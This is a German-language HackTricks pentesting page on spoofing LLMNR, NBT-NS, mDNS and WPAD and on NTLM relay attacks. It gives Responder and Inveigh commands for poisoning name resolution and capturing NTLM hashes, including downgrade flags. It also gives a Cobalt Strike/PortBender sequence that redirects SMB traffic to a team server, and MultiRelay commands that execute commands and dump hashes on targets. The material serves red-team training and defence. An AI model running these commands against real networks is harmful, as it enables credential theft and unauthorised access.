# Spoofing LLMNR, NBT-NS, mDNS/DNS und WPAD sowie Relay-Angriffe

{% hint style="success" %}
Lernen Sie und √ºben Sie AWS-Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen Sie und √ºben Sie GCP-Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositorys senden.

</details>
{% endhint %}

## Netzwerkprotokolle

### Lokale Hostaufl√∂sungsprotokolle
- **LLMNR, NBT-NS und mDNS**:
- Microsoft und andere Betriebssysteme verwenden LLMNR und NBT-NS zur lokalen Namensaufl√∂sung, wenn DNS fehlschl√§gt. Ebenso verwenden Apple- und Linux-Systeme mDNS.
- Diese Protokolle sind anf√§llig f√ºr Abfangen und Spoofing aufgrund ihrer nicht authentifizierten, broadcastartigen Natur √ºber UDP.
- [Responder](https://github.com/lgandx/Responder) kann verwendet werden, um Dienste zu imitieren, indem gef√§lschte Antworten an Hosts gesendet werden, die diese Protokolle abfragen.
- Weitere Informationen zur Dienstimitation mit Responder finden Sie [hier](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### Web Proxy Auto-Discovery Protocol (WPAD)
- WPAD erm√∂glicht Browsern, Proxyeinstellungen automatisch zu entdecken.
- Die Entdeckung erfolgt √ºber DHCP, DNS oder R√ºckgriff auf LLMNR und NBT-NS, wenn DNS fehlschl√§gt.
- Responder kann WPAD-Angriffe automatisieren und Clients zu b√∂sartigen WPAD-Servern umleiten.

### Responder f√ºr Protokollvergiftung
- **Responder** ist ein Tool, das zur Vergiftung von LLMNR-, NBT-NS- und mDNS-Abfragen verwendet wird und selektiv auf Abfragetypen reagiert, haupts√§chlich auf SMB-Dienste abzielt.
- Es ist in Kali Linux vorinstalliert und unter `/etc/responder/Responder.conf` konfigurierbar.
- Responder zeigt erfasste Hashes auf dem Bildschirm an und speichert sie im Verzeichnis `/usr/share/responder/logs`.
- Es unterst√ºtzt sowohl IPv4 als auch IPv6.
- Die Windows-Version von Responder ist [hier](https://github.com/lgandx/Responder-Windows) verf√ºgbar.

#### Ausf√ºhren von Responder
- Um Responder mit den Standardeinstellungen auszuf√ºhren: `responder -I <Schnittstelle>`
- F√ºr aggressiveres Sondieren (mit potenziellen Nebenwirkungen): `responder -I <Schnittstelle> -P -r -v`
- Techniken zum Erfassen von NTLMv1-Herausforderungen/Antworten f√ºr einfachere Knackvorg√§nge: `responder -I <Schnittstelle> --lm --disable-ess`
- Die WPAD-Imitation kann aktiviert werden mit: `responder -I <Schnittstelle> --wpad`
- NetBIOS-Anfragen k√∂nnen zur IP des Angreifers aufgel√∂st und ein Authentifizierungsproxy eingerichtet werden: `responder.py -I <Schnittstelle> -Pv`

### DHCP-Vergiftung mit Responder
- Das Spoofing von DHCP-Antworten kann die Routinginformationen eines Opfers dauerhaft vergiften und bietet eine unauff√§lligere Alternative zum ARP-Spoofing.
- Es erfordert genaue Kenntnisse der Konfiguration des Zielnetzwerks.
- Ausf√ºhren des Angriffs: `./Responder.py -I eth0 -Pdv`
- Diese Methode kann effektiv NTLMv1/2-Hashes erfassen, erfordert jedoch eine sorgf√§ltige Handhabung, um Netzwerkst√∂rungen zu vermeiden.

### Erfassen von Anmeldedaten mit Responder
- Responder wird Dienste mit den oben genannten Protokollen imitieren und Anmeldedaten erfassen (in der Regel NTLMv2 Challenge/Response), wenn ein Benutzer versucht, sich gegen die gef√§lschten Dienste zu authentifizieren.
- Versuche k√∂nnen unternommen werden, um auf NetNTLMv1 herabzustufen oder ESS zu deaktivieren, um das Knacken von Anmeldeinformationen zu erleichtern.

Es ist wichtig zu beachten, dass der Einsatz dieser Techniken legal und ethisch erfolgen sollte, um eine ordnungsgem√§√üe Autorisierung sicherzustellen und St√∂rungen oder unbefugten Zugriff zu vermeiden.

## Inveigh

Inveigh ist ein Tool f√ºr Penetrationstester und Red Teamer, das f√ºr Windows-Systeme entwickelt wurde. Es bietet √§hnliche Funktionen wie Responder und f√ºhrt Spoofing- und Man-in-the-Middle-Angriffe durch. Das Tool hat sich von einem PowerShell-Skript zu einer C#-Bin√§rdatei entwickelt, mit [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) und [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) als Hauptversionen. Detaillierte Parameter und Anweisungen finden Sie im [**Wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters).

Inveigh kann √ºber PowerShell betrieben werden:
```powershell
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
Oder ausgef√ºhrt als eine C#-Bin√§rdatei:
```bash
Inveigh.exe
```
### NTLM Relay Angriff

Dieser Angriff nutzt SMB-Authentifizierungssitzungen, um auf eine Zielmaschine zuzugreifen und bei Erfolg eine Systemshell zu erhalten. Wichtige Voraussetzungen sind:
- Der authentifizierende Benutzer muss √ºber lokale Admin-Zugriffsrechte auf dem weitergeleiteten Host verf√ºgen.
- SMB-Signierung sollte deaktiviert sein.

#### 445 Port Weiterleitung und Tunneling

In Szenarien, in denen eine direkte Netzwerkeinf√ºhrung nicht m√∂glich ist, muss der Datenverkehr auf Port 445 weitergeleitet und getunnelt werden. Tools wie [**PortBender**](https://github.com/praetorian-inc/PortBender) helfen dabei, den Port 445-Verkehr auf einen anderen Port umzuleiten, was entscheidend ist, wenn lokale Admin-Zugriffsrechte f√ºr das Laden von Treibern verf√ºgbar sind.

PortBender Einrichtung und Betrieb in Cobalt Strike:
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Weitere Tools f√ºr NTLM Relay Attacke

- **Metasploit**: Einrichten mit Proxies, lokalen und entfernten Host-Details.
- **smbrelayx**: Ein Python-Skript zum Weiterleiten von SMB-Sitzungen und Ausf√ºhren von Befehlen oder Bereitstellen von Hintert√ºren.
- **MultiRelay**: Ein Tool aus der Responder-Suite zum Weiterleiten bestimmter Benutzer oder aller Benutzer, Ausf√ºhren von Befehlen oder Dumpen von Hashes.

Jedes Tool kann konfiguriert werden, um bei Bedarf √ºber einen SOCKS-Proxy zu arbeiten, was Angriffe auch bei indirektem Netzwerkzugriff erm√∂glicht.

### MultiRelay Betrieb

MultiRelay wird aus dem _**/usr/share/responder/tools**_ Verzeichnis ausgef√ºhrt und zielt auf spezifische IPs oder Benutzer ab.
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
### Erzwingen von NTLM-Anmeldungen

In Windows **k√∂nnen Sie m√∂glicherweise einige privilegierte Konten zwingen, sich bei beliebigen Maschinen anzumelden**. Lesen Sie die folgende Seite, um zu erfahren, wie:

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

## Referenzen
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
* [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)


{% hint style="success" %}
Lernen Sie & √ºben Sie AWS-Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen Sie & √ºben Sie GCP-Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.

</details>
{% endhint %}
